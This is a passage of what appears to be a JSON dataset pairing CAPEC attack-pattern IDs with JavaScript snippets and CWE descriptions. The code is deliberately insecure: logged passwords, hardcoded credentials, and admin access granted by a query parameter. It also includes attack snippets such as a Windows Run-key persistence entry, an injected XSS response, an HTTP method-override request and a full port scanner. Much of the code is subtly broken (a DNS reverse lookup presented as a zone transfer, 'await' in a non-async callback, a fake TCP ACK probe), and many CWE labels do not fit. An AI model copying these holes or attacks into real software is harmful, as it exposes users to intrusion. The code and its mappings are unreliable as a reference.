        "description": "This code snippet demonstrates the CAPEC of leveraging alternate encoding to bypass input validation. The userInput is encoded using encodeURIComponent, then decoded using decodeURIComponent, and finally filtered to remove script tags. However, the canonicalization step of converting to lowercase is performed after filtering, allowing the malicious input to pass validation. This code embodies CWEs 173, 172, 180, 181, 74, 20, and 692."
    },
    {
        "capec_id": "268",
        "code_snippet": "const fs = require('fs');\nconst logFile = './log.txt';\n\n// CWE-117: Improper Output Neutralization for Logs\nfunction logEvent(event) {\n  fs.appendFile(logFile, event + '\\n', (err) => {\n    if (err) {\n      console.error(err);\n    }\n  });\n}\n\n// CWE-532: Insertion of Sensitive Information into Log File\nlogEvent('User ' + user.username + ' logged in with password: ' + user.password);\n\n// CWE-779: Logging of Excessive Data\nfor (let i = 0; i < 1000; i++) {\n  logEvent('Excessive log entry ' + i);\n}\n\n// CWE-778: Insufficient Logging\nfunction handleSecurityCriticalEvent(event) {\n  // No logging or incomplete logging of security-critical event\n}\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nlogEvent('System configuration: ' + JSON.stringify(systemConfig));",
        "description": "This code snippet demonstrates the CAPEC of log manipulation by injecting malicious log entries, deleting, or forging log entries to mislead an audit or cover tracks of an attack. It includes CWE-117 by not neutralizing output written to logs, CWE-532 by inserting sensitive information into the log file, CWE-779 by logging excessive data, CWE-778 by insufficiently logging security-critical events, and CWE-497 by exposing sensitive system information to an unauthorized control sphere."
    },
    {
        "capec_id": "269",
        "code_snippet": "const reg = require('registry');\n\n// CWE-314: Cleartext Storage in the Registry\nreg.set('HKCU\\Software\\MyApp', 'password', 'mysecretpassword');\n\n// CWE-270: Privilege Context Switching Error\nprocess.setuid(0);\n\n// CWE-1112: Incomplete Documentation of Program Execution\nconst exec = require('child_process').exec;\nexec('reg add HKCU\\Software\\MyApp /v password /t REG_SZ /d mysecretpassword /f');\n\n// CWE-217 (related to CWE-766 and CWE-767): Failure to Protect Stored Data from Modification\nconst fs = require('fs');\nfs.writeFileSync('C:\\path\\to\\config.json', '{\"password\":\"mysecretpassword\"}');",
        "description": "This code snippet demonstrates the CAPEC-203 pattern by manipulating application registry values. It stores sensitive information in cleartext in the registry (CWE-314), switches to a privileged context without proper management (CWE-270), and executes a program with incomplete documentation (CWE-1112). Additionally, it fails to protect stored data from modification (CWE-217, related to CWE-766 and CWE-767)."
    },
    {
        "capec_id": "270",
        "code_snippet": "const reg = require('registry-js');\nconst key = new reg({ hive: reg.HKCU, key: 'Software\\Microsoft\\Windows\\CurrentVersion\\Run' });\nkey.set('MaliciousExecutable', 'C:\\Path\\To\\Malicious\\Executable.exe', reg.REG_SZ);\nconsole.log('Malicious executable added to run keys.');",
        "description": "This JavaScript code snippet uses the registry-js library to add a new entry to the 'run keys' in the Windows registry, allowing an adversary to execute a malicious executable with the authorized user's level of permissions. This code embodies the CAPEC of adding a new entry to the 'run keys' and relates to CWEs 15, 1392, 520, 314, and 1394, as it uses default credentials, impersonation, and cleartext storage in the registry, and could potentially use default cryptographic keys."
    },
    {
        "capec_id": "271",
        "code_snippet": "const schema = {\n  \"users\": {\n    \"properties\": {\n      \"username\": {\n        \"type\": \"string\"\n      },\n      \"password\": {\n        \"type\": \"string\",\n        \"default\": \"defaultPassword\"\n      }\n    }\n  }\n};\n\n// CWE-15: External Control of System or Configuration Setting\nconst userInput = {\n  \"users\": {\n    \"properties\": {\n      \"username\": {\n        \"type\": \"string\",\n        \"default\": \"admin\"\n      },\n      \"password\": {\n        \"type\": \"string\",\n        \"default\": \"newPassword\"\n      }\n    }\n  }\n};\n\n// CWE-501: Trust Boundary Violation\nObject.assign(schema, userInput);\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = {\n  \"users\": {\n    \"properties\": {\n      \"username\": {\n        \"type\": \"string\",\n        \"default\": \"maliciousUser\"\n      },\n      \"password\": {\n        \"type\": \"string\",\n        \"default\": \"maliciousPassword\",\n        \"set\": function(value) {\n          // malicious code execution\n          console.log('Malicious code executed');\n        }\n      }\n    }\n  }\n};\nObject.assign(schema, maliciousCode);\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconsole.log(schema);\n\n// CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\nconst sensitiveData = {\n  \"username\": \"admin\",\n  \"password\": \"password\"\n};\nconst storedData = JSON.stringify(sensitiveData);\nconsole.log(storedData);",
        "description": "This code snippet demonstrates the CAPEC of corrupting or modifying a schema to undermine the security of the target. It uses CWE-15 to externally control the system configuration, CWE-501 to violate the trust boundary, CWE-506 to embed malicious code, CWE-497 to expose sensitive system information, and CWE-212 to improperly remove sensitive information before storage or transfer."
    },
    {
        "capec_id": "272",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const token = generateToken(username, password);\n  res.cookie('authToken', token, { httpOnly: true });\n  res.redirect('/protected');\n});\n\napp.get('/protected', (req, res) => {\n  const token = req.cookies.authToken;\n  if (token) {\n    const username = verifyToken(token);\n    if (username) {\n      res.send(`Welcome, ${username}!`);\n    } else {\n      res.status(401).send('Invalid token');\n    }\n  } else {\n    res.status(401).send('No token provided');\n  }\n});\n\nfunction generateToken(username, password) {\n  // Insecure token generation, vulnerable to capture-replay attacks\n  return `${username}:${password}`;\n}\n\nfunction verifyToken(token) {\n  // Insecure token verification, vulnerable to reflection attacks\n  const [username, password] = token.split(':');\n  if (username === 'admin' && password === 'password') {\n    return username;\n  } else {\n    return null;\n  }\n}",
        "description": "This code snippet demonstrates a vulnerable authentication system that is susceptible to various attacks, including capture-replay and reflection attacks. The generateToken function generates an insecure token that can be easily captured and replayed by an attacker, while the verifyToken function has an incorrect implementation that allows an attacker to impersonate a trusted user. The code also lacks proper verification of the source of the communication channel, making it vulnerable to impersonation attacks."
    },
    {
        "capec_id": "273",
        "code_snippet": "const http = require('http');\nconst maliciousResponse = 'HTTP/1.1 200 OK\\r\\nContent-Length: 25\\r\\n\\r\\n<script>alert(\"XSS\")</script>'; // malicious HTTP response\n\nhttp.createServer((req, res) => {\n  const upstreamResponse = 'HTTP/1.1 200 OK\\r\\nContent-Length: 20\\r\\n\\r\\nHello, World!'; // legitimate HTTP response\n  res.write(upstreamResponse);\n  res.write(maliciousResponse); // inject malicious response\n  res.end();\n}).listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable HTTP server that injects a malicious HTTP response into a legitimate response, exploiting CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'). The malicious response is not properly sanitized, allowing an adversary to inject unauthorized content. This vulnerability can lead to HTTP Request/Response Smuggling (CWE-444) and HTTP Request/Response Splitting (CWE-113)."
    },
    {
        "capec_id": "274",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('TRACE', '/admin/deleteUser', true);\nxhr.setRequestHeader('X-HTTP-Method-Override', 'DELETE');\nxhr.send();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of modifying the HTTP Verb to bypass access restrictions. The code sends a TRACE request to the '/admin/deleteUser' endpoint, but overrides the HTTP method to DELETE using the 'X-HTTP-Method-Override' header. This could allow an attacker to bypass access controls that only check the HTTP Verb, as described in CWE-302, CWE-654, CWE-598, CWE-116, and CWE-644."
    },
    {
        "capec_id": "275",
        "code_snippet": "const dns = require('dns');\nconst http = require('http');\n\n// CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\nfunction getInternalIP(hostname, callback) {\n  dns.reverse(hostname, (err, addresses) => {\n    if (err) {\n      callback(err);\n    } else {\n      // CWE-1327: Binding to an Unrestricted IP Address\n      const internalIP = '10.0.0.1'; // internal IP address\n      callback(null, internalIP);\n    }\n  });\n}\n\n// CWE-605: Multiple Binds to the Same Port\nconst server = http.createServer((req, res) => {\n  res.writeHead(302, {\n    'Location': 'http://' + req.headers.host + ':8080'\n  });\n  res.end();\n});\nserver.listen(8080, '0.0.0.0'); // CWE-1327: Binding to an Unrestricted IP Address\n\n// CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\nhttp.get('http://example.com', (res) => {\n  let redirectLocation = res.headers.location;\n  if (redirectLocation) {\n    http.get(redirectLocation, (res) => {\n      console.log(res.statusCode);\n    });\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC where an adversary serves content whose IP address is resolved by a DNS server that the adversary controls. The code uses Node.js to create an HTTP server that binds to an unrestricted IP address (CWE-1327) and listens on port 8080. The server redirects incoming requests to an internal IP address (CWE-1327) using reverse DNS resolution (CWE-350). The code also demonstrates an open redirect vulnerability (CWE-601) by redirecting to an untrusted site. Note that this code is for demonstration purposes only and should not be used in production."
    },
    {
        "capec_id": "276",
        "code_snippet": "const debugMode = true;\n\nfunction sendSensitiveData(data) {\n  if (debugMode) {\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    const socket = new WebSocket('ws://localhost:8080');\n    socket.send(data);\n  } else {\n    const secureSocket = new SecureWebSocket('wss://localhost:8080');\n    secureSocket.send(encryptData(data));\n  }\n}\n\nfunction receiveData() {\n  const socket = new WebSocket('ws://localhost:8080');\n  socket.onmessage = (event) => {\n    // CWE-707: Improper Neutralization\n    const receivedData = event.data;\n    processReceivedData(receivedData);\n  };\n}\n\nfunction processReceivedData(data) {\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n  if (!verifyMessageIntegrity(data)) {\n    console.log('Message integrity compromised');\n  } else {\n    // CWE-1292: Incorrect Conversion of Security Identifiers\n    const securityIdentifier = convertBusTransactionSignalToSecurityIdentifier(data);\n    if (securityIdentifier === 'admin') {\n      // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n      activateDebugLogic();\n    }\n  }\n}",
        "description": "This code snippet demonstrates a vulnerable implementation of inter-component protocols in a JavaScript application. It includes multiple CWEs, such as cleartext transmission of sensitive information, improper neutralization, improper enforcement of message integrity, incorrect conversion of security identifiers, and hardware allowing activation of test or debug logic at runtime. The code is intended to illustrate the potential vulnerabilities in inter-component protocols and should not be used in production."
    },
    {
        "capec_id": "277",
        "code_snippet": "const xmlParser = require('xml2js');\nconst xmlBuilder = new xmlParser.Builder();\n\nconst purchaseOrder = {\n  'orderID': 'PO123',\n  'customerID': 'CUS123',\n  'orderDate': '2022-01-01',\n  'items': [\n    {\n      'itemID': 'ITEM1',\n      'quantity': 2,\n      'price': 10.99\n    },\n    {\n      'itemID': 'ITEM2',\n      'quantity': 3,\n      'price': 9.99\n    }\n  ]\n};\n\nconst xmlString = xmlBuilder.buildObject(purchaseOrder);\n\n// CWE-707: Improper Neutralization\n// CWE-188: Reliance on Data/Memory Layout\nconst xmlDoc = xmlParser.parseString(xmlString);\nconst orderID = xmlDoc.purchaseOrder.orderID;\nconst customerID = xmlDoc.purchaseOrder.customerID;\n\n// CWE-201: Insertion of Sensitive Information Into Sent Data\nconst sensitiveInfo = {\n  'creditCardNumber': '1234-5678-9012-3456',\n  'expirationDate': '2025-12-31'\n};\nxmlDoc.purchaseOrder.sensitiveInfo = sensitiveInfo;\n\n// CWE-302: Authentication Bypass by Assumed-Immutable Data\nconst immutableData = {\n  'username': 'admin',\n  'password': 'password123'\n};\nxmlDoc.purchaseOrder.authentication = immutableData;\n\n// CWE-1292: Incorrect Conversion of Security Identifiers\nconst securityIdentifiers = {\n  'role': 'admin',\n  'permissions': ['read', 'write', 'execute']\n};\nxmlDoc.purchaseOrder.securityIdentifiers = securityIdentifiers;\n\nconsole.log(xmlDoc);",
        "description": "This code snippet demonstrates a vulnerable implementation of a data interchange protocol, specifically a purchase order protocol. It highlights several CWEs, including improper neutralization of input data, reliance on data/memory layout, insertion of sensitive information, authentication bypass by assumed-immutable data, and incorrect conversion of security identifiers. The code generates an XML string representing a purchase order, but fails to properly validate and sanitize the input data, allowing an attacker to inject malicious data, bypass authentication, and gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "278",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use('/', (req, res) => {\n  const userAgent = req.headers['user-agent'];\n  if (userAgent.includes('Chrome')) {\n    // CWE-602: Client-Side Enforcement of Server-Side Security\n    // The server trusts the client to send a valid User-Agent header\n    res.send('Welcome, Chrome user!');\n  } else {\n    // CWE-707: Improper Neutralization\n    // The server does not validate the User-Agent header\n    res.send('Welcome, unknown user!');\n  }\n});\n\napp.use('/admin', (req, res) => {\n  const isAdmin = req.query.isAdmin;\n  if (isAdmin === 'true') {\n    // CWE-368: Context Switching Race Condition\n    // The server performs a series of non-atomic actions to switch between contexts\n    res.send('Welcome, admin!');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\n\napp.use('/spec', (req, res) => {\n  const specVersion = req.headers['spec-version'];\n  if (specVersion === '1.0') {\n    // CWE-573: Improper Following of Specification by Caller\n    // The server does not follow the specification for the given version\n    res.send('Welcome, spec 1.0 user!');\n  } else {\n    res.send('Unknown spec version');\n  }\n});\n\napp.use('/proxy', (req, res) => {\n  const proxyReq = http.request(\n    {\n      hostname: 'example.com',\n      path: req.url,\n      method: req.method,\n      headers: req.headers\n    },\n    (proxyRes) => {\n      // CWE-444: Inconsistent Interpretation of HTTP Requests\n      // The proxy server does not interpret malformed HTTP requests correctly\n      res.writeHead(proxyRes.statusCode, proxyRes.headers);\n      proxyRes.pipe(res);\n    }\n  );\n  req.pipe(proxyReq);\n});",
        "description": "This code snippet demonstrates the CAPEC pattern of manipulating web service related protocols to cause a web application or service to react differently than intended. It includes vulnerabilities related to CWE-602, CWE-707, CWE-368, CWE-573, and CWE-444."
    },
    {
        "capec_id": "279",
        "code_snippet": "const soap = require('soap');\nconst xml = '<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope/\">\n  <soap:Body>\n    <m:GetPriceResponse>\n      <m:Price>100</m:Price>\n    </m:GetPriceResponse>\n  </soap:Body>\n</soap:Envelope>';\n\nconst server = http.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let soapReq = req.body.toString();\n    let parser = new DOMParser();\n    let xmlDoc = parser.parseFromString(soapReq, \"text/xml\");\n    let price = xmlDoc.getElementsByTagName('m:Price')[0].childNodes[0].nodeValue;\n    res.writeHead(200, {'Content-Type': 'text/xml'});\n    res.end('<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope/\">\n      <soap:Body>\n        <m:GetPriceResponse>\n          <m:Price>' + price + '</m:Price>\n        </m:GetPriceResponse>\n      </soap:Body>\n    </soap:Envelope>');\n  }\n});\nserver.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable SOAP server that does not properly validate or neutralize the input XML data, making it susceptible to attacks such as XML external entity injection (CWE-611) and authentication bypass via capture-replay (CWE-294). The server also relies on client-side authentication (CWE-603) and does not enforce server-side security (CWE-602). An attacker can manipulate the SOAP parameters to inject malicious data or replay captured authentication requests to bypass security controls."
    },
    {
        "capec_id": "280",
        "code_snippet": "const soap = require('soap');\nconst wsdlUrl = 'http://example.com/wsdl';\n\nsoap.createClient(wsdlUrl, (err, client) => {\n  if (err) {\n    console.error(err);\n    return;\n  }\n\n  // CWE-651: Exposure of WSDL File Containing Sensitive Information\n  console.log(client.describe());\n\n  // CWE-294: Authentication Bypass by Capture-replay\n  const originalRequest = {\n    'authToken': 'capturedAuthToken'\n  };\n  client.MyService(originalRequest, (err, result) => {\n    if (err) {\n      console.error(err);\n      return;\n    }\n    console.log(result);\n  });\n});",
        "description": "This code snippet demonstrates a SOAP client that exposes sensitive information through the WSDL file and is vulnerable to authentication bypass by capture-replay attack. The WSDL file is accessed and its contents are logged to the console, potentially revealing sensitive information. The code then uses a captured authentication token to make a request to the SOAP service, bypassing authentication."
    },
    {
        "capec_id": "285",
        "code_snippet": "const ping = require('ping');\n\nconst targetHost = 'example.com';\n\nping.sys.probe(targetHost, function(isAlive){\n  if (isAlive) {\n    console.log(targetHost + ' is alive');\n    // Send sensitive information in cleartext\n    const xhr = new XMLHttpRequest();\n    xhr.open('GET', 'http://' + targetHost + '/sensitiveData', true);\n    xhr.send();\n  } else {\n    console.log(targetHost + ' is not alive');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of sending an ICMP Echo Request to determine if a target system is responsive. It uses the 'ping' module to send the request and handle the response. If the target host is alive, it sends a GET request to retrieve sensitive information in cleartext, which is vulnerable to CWE-319. The code also lacks proper error handling and logging, making it vulnerable to CWE-200 and CWE-1320. Additionally, the use of XMLHttpRequest can lead to CWE-444 if not properly validated. Furthermore, the code does not prevent debug logic from being activated at runtime, making it vulnerable to CWE-1313."
    },
    {
        "capec_id": "287",
        "code_snippet": "const net = require('net');\nconst sockets = [];\n\nfor (let i = 0; i < 100; i++) {\n  const socket = new net.Socket();\n  socket.bind(8080, () => {\n    sockets.push(socket);\n  });\n}\n\nsetInterval(() => {\n  for (let i = 0; i < sockets.length; i++) {\n    const socket = sockets[i];\n    socket.write('Hello from ' + i + '\\n');\n  }\n}, 1000);\n\nconst scanner = () => {\n  for (let port = 1; port <= 65535; port++) {\n    const socket = new net.Socket();\n    socket.connect(port, '127.0.0.1', () => {\n      console.log(`Port ${port} is open`);\n    });\n  }\n};\n\nscanner();",
        "description": "This JavaScript code snippet demonstrates a vulnerable code that embodies the main idea of the CAPEC, which is a SYN scan to determine the status of ports on the remote target. The code creates multiple sockets binding to the same port (CWE-605), transmits sensitive information in cleartext (CWE-319), and exposes sensitive information to an unauthorized actor (CWE-200). The code also has an excessive attack surface (CWE-1125) and allows for the activation of test or debug logic at runtime (CWE-1313). The scanner function performs a SYN scan on the local machine, connecting to all possible ports and logging the open ones."
    },
    {
        "capec_id": "288",
        "code_snippet": "const dns = require('dns');\n\nfunction authenticateUser(username, password) {\n  const userIP = getUserIP();\n  const dnsLookup = dns.lookup(userIP, (err, hostname, service) => {\n    if (err) {\n      console.error(err);\n    } else {\n      if (hostname === 'trusted-hostname') {\n        // Trusting self-reported DNS name (CWE-292)\n        return authenticateWithHostname(username, password, hostname);\n      } else {\n        // Reliance on DNS lookups in a security decision (CWE-247)\n        return authenticateWithIP(username, password, userIP);\n      }\n    }\n  });\n}\n\nfunction authenticateWithHostname(username, password, hostname) {\n  // Capture-replay flaw (CWE-294)\n  const authRequest = {\n    username: username,\n    password: password,\n    hostname: hostname\n  };\n  return sendAuthRequestToServer(authRequest);\n}\n\nfunction authenticateWithIP(username, password, userIP) {\n  // Call to non-ubiquitous API (CWE-589)\n  if (process.platform === 'win32') {\n    return sendAuthRequestToServerWin(username, password, userIP);\n  } else {\n    return sendAuthRequestToServerUnix(username, password, userIP);\n  }\n}",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that relies on DNS lookups, trusts self-reported DNS names, and uses capture-replay authentication. It also uses non-ubiquitous APIs for authentication on different platforms."
    },
    {
        "capec_id": "289",
        "code_snippet": "const unprotectedRegion = { sensitiveData: 'confidential information' };\nconst protectedRegion = { restrictedAccess: 'admin only' };\n\n// CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\nconst overlappingRegion = { ...unprotectedRegion, ...protectedRegion };\n\n// CWE-1229: Creation of Emergent Resource\nconst emergentResource = () => {\n  return { ...overlappingRegion, additionalPrivileges: true };\n};\n\n// CWE-592: DEPRECATED: Authentication Bypass Issues (related to CWE-287)\nconst bypassAuth = () => {\n  return emergentResource();\n};\n\n// CWE-216: DEPRECATED: Containment Errors (Container Errors) (related to CWE-1316)\nconst containerError = () => {\n  return overlappingRegion;\n};\n\n// CWE-1303: Non-Transparent Sharing of Microarchitectural Resources\nconst microarchitecturalResource = () => {\n  return { cache: 'shared cache', branchPredictor: 'shared branch predictor' };\n};\n\n// CAPEC: Authentication Bypass\nconst authenticate = () => {\n  if (bypassAuth()) {\n    return 'access granted';\n  } else {\n    return 'access denied';\n  }\n};\n\nconsole.log(authenticate());",
        "description": "This code snippet demonstrates an authentication bypass attack by exploiting vulnerabilities in resource management and access control. It creates an emergent resource with overlapping protected and unprotected regions, allowing an attacker to bypass authentication and gain unauthorized access."
    },
    {
        "capec_id": "290",
        "code_snippet": "const dns = require('dns');\n\nasync function enumerateMXRecords(domain) {\n  try {\n    const mxRecords = await dns.promises.resolveMx(domain);\n    console.log(`MX Records for ${domain}:`);\n    mxRecords.forEach((record) => {\n      console.log(`  ${record.exchange} -> ${record.priority}`);\n      // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n      const reverseDNS = await dns.promises.reverse(record.exchange);\n      console.log(`  Reverse DNS: ${reverseDNS}`);\n      // CWE-941: Incorrectly Specified Destination in a Communication Channel\n      const socket = require('net').createConnection(25, record.exchange);\n      socket.write(`HELO ${domain}\\r\\n`);\n      socket.on('data', (data) => {\n        console.log(`  Banner: ${data}`);\n      });\n    });\n  } catch (err) {\n    console.error(`Error enumerating MX records: ${err}`);\n  }\n}\n\nenumerateMXRecords('example.com');",
        "description": "This JavaScript code snippet demonstrates the CAPEC of enumerating MX records for a given domain using DNS queries. It uses the 'dns' module to resolve the MX records and then performs a reverse DNS lookup on each record, which can reveal the IP address of the firewall or other internal systems (CWE-350). The code also establishes a connection to the mail server using the resolved MX record and sends a HELO command, which can reveal additional information about the internal system (CWE-941). This code snippet embodies the CWEs of Exposure of Sensitive Information to an Unauthorized Actor (CWE-200), Reliance on Reverse DNS Resolution for a Security-Critical Action (CWE-350), Obscured Security-relevant Information by Alternate Name (CWE-224), Incorrectly Specified Destination in a Communication Channel (CWE-941), and Omission of Security-relevant Information (CWE-223)."
    },
    {
        "capec_id": "291",
        "code_snippet": "const dns = require('dns');\n\nasync function zoneTransfer(domain) {\n  try {\n    const servers = await dns.resolveNs(domain);\n    for (const server of servers) {\n      const zoneData = await dns.reverse(server);\n      console.log(`Zone data for ${domain} from ${server}:`);\n      console.log(zoneData);\n    }\n  } catch (error) {\n    console.error(`Error performing zone transfer: ${error}`);\n  }\n}\n\nzoneTransfer('example.com');",
        "description": "This JavaScript code snippet demonstrates a DNS zone transfer attack, which exploits a misconfigured DNS server to obtain sensitive information about an organization's internal network. The code uses the 'dns' module to resolve the name servers for a given domain and then performs a reverse DNS lookup on each server to obtain zone data. This can reveal valuable information about the network topology, including IP addresses, hostnames, and possibly operating systems. The code does not properly validate the authenticity of the DNS responses, making it vulnerable to CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) and CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "292",
        "code_snippet": "const net = require('net');\nconst dns = require('dns');\n\nfunction pingSweep(ipRange) {\n  for (let i = 0; i < ipRange.length; i++) {\n    const socket = new net.Socket();\n    socket.connect(80, ipRange[i], () => {\n      console.log(`Host ${ipRange[i]} is alive`);\n      dns.reverse(ipRange[i], (err, hostname) => {\n        if (err) {\n          console.log(`Error resolving hostname for ${ipRange[i]}`);\n        } else {\n          console.log(`Hostname for ${ipRange[i]} is ${hostname}`);\n          // Perform security-critical action based on hostname\n          if (hostname === 'trusted-hostname') {\n            console.log(`Granting access to ${ipRange[i]}`);\n          }\n        }\n      });\n    });\n  }\n}\n\nconst ipRange = ['192.168.1.1', '192.168.1.2', '192.168.1.3'];\n\npingSweep(ipRange);\n",
        "description": "This code snippet demonstrates a ping sweep attack, which is a type of host discovery attack. It uses the net module to establish a connection to a range of IP addresses and the dns module to perform reverse DNS resolution. The code logs the IP addresses that respond to the connection attempt and resolves the hostname for each IP address. It then makes a security-critical decision based on the hostname, which is a CWE-350 violation. The code also uses IP addresses for authentication, which is a CWE-291 violation. Additionally, the code transmits sensitive information (the hostname) in cleartext, which is a CWE-319 violation. Finally, the code does not properly validate the response from the host, making it vulnerable to CWE-200 and CWE-509."
    },
    {
        "capec_id": "293",
        "code_snippet": "const traceroute = require('traceroute');\n\nasync function mapNetworkRoute(targetIP) {\n  const hops = [];\n  let ttl = 1;\n  while (ttl <= 30) {\n    const packet = {\n      src_ip: '0.0.0.0',\n      dst_ip: targetIP,\n      ttl: ttl\n    };\n    const response = await sendPacket(packet);\n    if (response.icmp_type === 11) {\n      hops.push({ ip: response.src_ip, ttl: ttl });\n    } else if (response.icmp_type === 0) {\n      break;\n    }\n    ttl++;\n  }\n  return hops;\n}\n\nasync function sendPacket(packet) {\n  // Send packet using UDP or TCP (not ICMP to bypass firewalls)\n  const socket = dgram.createSocket('udp4');\n  socket.send(packet, 0, packet.length, 33434, packet.dst_ip, (error) => {\n    if (error) {\n      console.log(error);\n    }\n  });\n  // Receive response and return it\n  socket.on('message', (message) => {\n    return message;\n  });\n}\n\nconst targetIP = '192.168.1.1';\nconst networkRoute = mapNetworkRoute(targetIP);\nconsole.log(networkRoute);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of a traceroute utility, which can be used to map out the network route to a target destination. The code uses UDP packets to send packets to the target IP with incrementing TTL values, and receives ICMP diagnostic messages to identify the hops along the way. The code exposes sensitive information about the network topology and system information, violating CWE-200, CWE-319, CWE-497, and CWE-941. Additionally, the code stores sensitive trace data in an unprotected location, violating CWE-1323."
    },
    {
        "capec_id": "294",
        "code_snippet": "const icmp = require('icmp');\nconst net = require('net');\n\nconst addressMaskRequest = new icmp.Message(icmp.TYPE_ADDRESS_MASK_REQUEST);\n\nconst socket = new net.Socket();\nsocket.connect(7, 'targetIP', () => {\n  socket.write(addressMaskRequest.pack());\n});\n\nsocket.on('data', (data) => {\n  const addressMaskReply = icmp.Message.unpack(data);\n  if (addressMaskReply.type === icmp.TYPE_ADDRESS_MASK_REPLY) {\n    const subnetMask = addressMaskReply.data.subnetMask;\n    const defaultGateway = addressMaskReply.data.gateway;\n    const broadcastAddress = addressMaskReply.data.broadcast;\n    // Use gathered information for malicious purposes\n    console.log(`Subnet Mask: ${subnetMask}`);\n    console.log(`Default Gateway: ${defaultGateway}`);\n    console.log(`Broadcast Address: ${broadcastAddress}`);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of sending an ICMP Type 17 Address Mask Request to gather information about a target's networking configuration. The code uses the 'icmp' and 'net' modules to create an ICMP Address Mask Request message and send it to the target IP. The response is then parsed to extract the subnet mask, default gateway, and broadcast address. This information can be used for malicious purposes such as planning router-based attacks or denial-of-service attacks against the broadcast address. The code relates to CWEs 200, 291, 1316, 1327, and 923, as it exposes sensitive information, relies on IP address for authentication, and establishes a communication channel without proper endpoint verification."
    },
    {
        "capec_id": "295",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const startTime = new Date().getTime();\n  const data = getDataFromDatabase(req.query.id);\n  const endTime = new Date().getTime();\n  const timeTaken = endTime - startTime;\n  res.set('X-Timing', timeTaken);\n  res.json(data);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side implementation that exposes sensitive information about the time taken to process a request. The 'X-Timing' header reveals the time taken to retrieve data from the database, which can be used to infer information about the system's internal state. An attacker can use this information to bypass time-based security algorithms or authentication mechanisms. The use of the GET request method with sensitive query strings (CWE-598) and the observable timing discrepancy (CWE-208) make this code vulnerable to attacks."
    },
    {
        "capec_id": "296",
        "code_snippet": "const icmp = require('icmp');\nconst net = require('net');\n\nconst infoRequest = new icmp.Message(icmp.Message.Type.INFO_REQUEST);\nconst socket = new net.Socket();\nsocket.connect(7, 'localhost', () => {\n  socket.write(infoRequest.encode());\n});\n\nsocket.on('data', (data) => {\n  const response = icmp.Message.decode(data);\n  if (response.type === icmp.Message.Type.INFO_REPLY) {\n    console.log(`Received info reply: ${response.info}`);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable ICMP client that sends an ICMP Information Request to a host and logs the response. The code uses the 'icmp' and 'net' modules to create an ICMP socket, send an ICMP Information Request, and handle the response. This code embodies the CAPEC of sending an ICMP Information Request to determine if a host will respond to this deprecated mechanism, which can lead to exposure of sensitive information (CWE-200, CWE-497) and cleartext transmission of sensitive information (CWE-319). The code also lacks proper identifier mechanisms for IP blocks (CWE-1192) and entity transactions (CWE-1302), making it vulnerable to unauthorized access and manipulation."
    },
    {
        "capec_id": "297",
        "code_snippet": "const net = require('net');\n\nfunction tcpAckPing(host, port) {\n  const socket = new net.Socket();\n  socket.connect(port, host, () => {\n    socket.write(Buffer.from([0x12, 0x34, 0x00, 0x00, 0x50, 0x02, 0x00, 0x00])); // sending ACK packet\n  });\n  socket.on('data', (data) => {\n    if (data[0] === 0x14) { // RST packet received\n      console.log(`Host ${host} is alive`);\n    }\n  });\n}\n\ntcpAckPing('example.com', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP ACK ping attack, which sends an ACK packet to a remote host to determine if it is alive. The code uses the net module to create a socket and connect to the specified host and port. It then sends an ACK packet and listens for a response. If a RST packet is received, it indicates that the host is alive. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the host's liveness information to an unauthorized actor. It also relates to CWE-605 (Multiple Binds to the Same Port) as it could be used to steal or spoof services on the same port. Additionally, it touches on CWE-828 (Signal Handler with Functionality that is not Asynchronous-Safe) as it uses a signal handler to process the response, and CWE-1276 (Hardware Child Block Incorrectly Connected to Parent System) as it could be used to exploit incorrectly connected signals. Finally, it relates to CWE-319 (Cleartext Transmission of Sensitive Information) as it transmits sensitive information in cleartext."
    },
    {
        "capec_id": "298",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nfunction udpPing(host, port) {\n  client.send(Buffer.from(''), 0, 0, port, host, (error) => {\n    if (error) {\n      console.log(`Host ${host} is not alive`);\n    } else {\n      client.on('message', (message, remoteInfo) => {\n        if (message.toString() === 'ICMP port unreachable') {\n          console.log(`Host ${host} is alive`);\n        }\n      });\n    }\n  });\n}\n\nudpPing('192.168.1.1', 65000);",
